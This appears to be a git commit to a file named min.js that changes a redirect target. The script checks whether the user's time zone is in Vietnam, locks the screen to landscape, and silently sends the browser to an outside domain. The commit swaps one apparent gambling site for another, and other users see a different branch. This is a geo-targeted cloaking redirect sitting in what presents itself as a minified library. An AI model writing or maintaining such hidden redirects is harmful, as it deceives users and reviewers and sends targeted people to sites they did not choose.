bf4a1326f13fab67c49a1ee7bd0c87c5d124c72b
hai07t <hai07t@gmail.com>
2025-10-15 10:05:52 +0700

    Update min.js

--- min.js
+++ min.js
@@ -4,7 +4,7 @@ if (userTimeZone === "Asia/Ho_Chi_Minh" || userTimeZone === "Asia/Saigon") {
   if (window.AndroidOrientation && AndroidOrientation.lockLandscape) {
     AndroidOrientation.lockLandscape();
   }
-  var to = "https://play.binh88.tv";
+  var to = "https://play.sao789a.me";
   window.location.href = to;
 } else {
   if (window.AndroidOrientation && AndroidOrientation.lockPortrait) {
